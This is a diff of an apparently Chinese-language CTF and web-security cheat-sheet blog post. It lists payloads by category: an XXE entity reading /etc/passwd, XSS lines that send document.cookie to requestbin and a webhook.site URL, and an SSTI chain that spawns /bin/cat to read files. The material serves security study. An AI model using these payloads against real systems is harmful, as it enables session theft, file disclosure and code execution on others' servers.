@@ -28,12 +28,14 @@ date: 2024-02-07
 #### SQLi
 * [SQLMAP1](https://ithelp.ithome.com.tw/articles/10249487)
 * [SQLMAP2](https://ithelp.ithome.com.tw/articles/10202811)
+
 #### XXE - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <data><ID>&xxe;</ID></data>
 ```
+
 #### XSS - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 ```javascript
 </script><script>
@@ -52,7 +54,9 @@ window.location=<requestbin.com>/?a+document.cookie
 fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GET', headers: { 'Cookie': document.cookie } })
 ```
 {% endraw %}
+
 #### [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
+
 #### SSTI - [Payload Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/): 
 * 用[tplmap](https://github.com/epinna/tplmap)直接打
 * SSTI Payload: 記得找<span style="background-color: yellow">os.\_wrap_close</span>
@@ -66,7 +70,6 @@ fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GE
     {{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['spawnl']('P_WAIT', "/bin/cat", "cat", file.lower())}}
     ```
     {% endraw %}
-
 
 ### LFI
 只是能讀取到victim server上的file content，不見得會有價值，需要搭配其他手法，例如
@@ -116,8 +119,6 @@ create一個偽造的payload和一個對外的中間server溝通，並讓這個�
 ||[aadecode](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)|
 
 * psysh: PHP的互動式shell
-
-## Others
 * wasm → c: [wabt](https://github.com/WebAssembly/wabt)
     ```bash
     # 安裝Cmake，所有過程一定要用WSL
